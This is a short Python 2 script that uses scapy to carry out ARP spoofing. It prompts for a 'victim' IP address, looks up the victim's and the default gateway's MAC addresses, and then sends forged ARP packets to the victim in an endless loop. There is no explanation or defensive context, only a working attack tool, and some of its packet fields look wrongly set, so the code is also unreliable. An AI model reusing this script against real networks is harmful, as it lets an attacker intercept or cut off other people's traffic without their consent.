from scapy.all import *
from netifaces import *
import subprocess, shlex, re, threading
 
def run():
	while True:
		send(poisoning)


str_ifconfig = subprocess.check_output(shlex.split('ifconfig'))
re_ifconfigIP = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
re_ifconfigMAC = r'(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})'
 
ifconfigIP = re.findall('inet addr:'+re_ifconfigIP, str_ifconfig)
ifconfigMAC = re.findall('HWaddr '+re_ifconfigMAC, str_ifconfig)
 
print "My IP : "+ifconfigIP[1]
print "My MAC : "+ifconfigMAC[1]
 
print "Victim IP"
victimIP = raw_input()
Vresult = sr1(ARP(op = ARP.who_has, psrc = ifconfigIP, pdst = victimIP))

victimMAC = Vresult.hwsrc
victimIP = Vresult.psrc
print "Victim IP : "+victimIP
print "Victim MAC : "+victimMAC

gateways = gateways()
gatewayIP = gateways['default'].values()[0][0]

Gresult = sr1(ARP(op = ARP.who_has, psrc = ifconfigIP, pdst = gatewayIP))
gatewayMAC = Gresult.hwsrc

print "Gateway IP : "+gatewayIP
print "Gateway MAC : "+gatewayMAC

poisoning = ARP()
poisoning.psrc = ifconfigIP[1]
poisoning.pdst = victimIP
poisoning.hwsrc = gatewayMAC
poisoning.hwdst = victimMAC

tread = threading.Thread(target=run)

tread.start()


